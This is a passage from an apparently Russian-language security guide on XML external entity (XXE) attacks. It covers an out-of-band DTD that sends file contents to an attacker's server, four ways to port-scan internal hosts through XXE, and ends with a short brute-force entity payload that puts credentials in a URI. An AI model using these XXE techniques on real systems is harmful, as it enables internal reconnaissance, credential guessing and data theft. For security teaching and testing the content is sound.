    Второй DTD заставляет систему отправлять содержимое файла обратно на сервер злоумышленника в качестве параметра URL.

    Сканирование портов¶

    Количество и тип информации, генерируемой при сканировании портов, зависит от типа реализации. Ответы можно классифицировать следующим образом:

    1) Полное раскрытие: Это простейший и наиболее нетипичный сценарий; при полном раскрытии можно чётко видеть, что происходит, получая полные ответы от опрашиваемого сервера. Вы получаете точное представление о том, что произошло при подключении к удалённому хосту.

    2) Основанное на ошибках: Если нельзя увидеть ответ от удалённого сервера, можно использовать информацию, генерируемую ответом об ошибке. Рассмотрим веб-сервис, раскрывающий детали ошибки в элементе SOAP Fault при попытке установить соединение:

    java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)

    3) Основанное на тайм-аутах: Сканер может генерировать тайм-ауты при подключении к открытым или закрытым портам в зависимости от схемы и базовой реализации. Если тайм-ауты возникают при попытке подключиться к закрытому порту (что может занять одну минуту), время ответа при подключении к открытому порту будет очень быстрым (например, одна секунда). Разница между открытыми и закрытыми портами становится весьма очевидной.

    4) Основанное на времени: Иногда может быть сложно определить разницу между закрытыми и открытыми портами, поскольку результаты очень незначительны. Единственный способ с уверенностью узнать статус порта — взять несколько измерений времени, необходимого для достижения каждого хоста, затем проанализировать среднее время для каждого порта, чтобы определить его статус. Этот тип атаки будет сложно выполнить в сетях с высокой задержкой.

    Брутфорс¶

    Как только злоумышленник подтверждает возможность сканирования портов, выполнить брутфорс-атаку — вопрос встраивания username и password в схему URI (http, ftp и т.д.):

    <!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
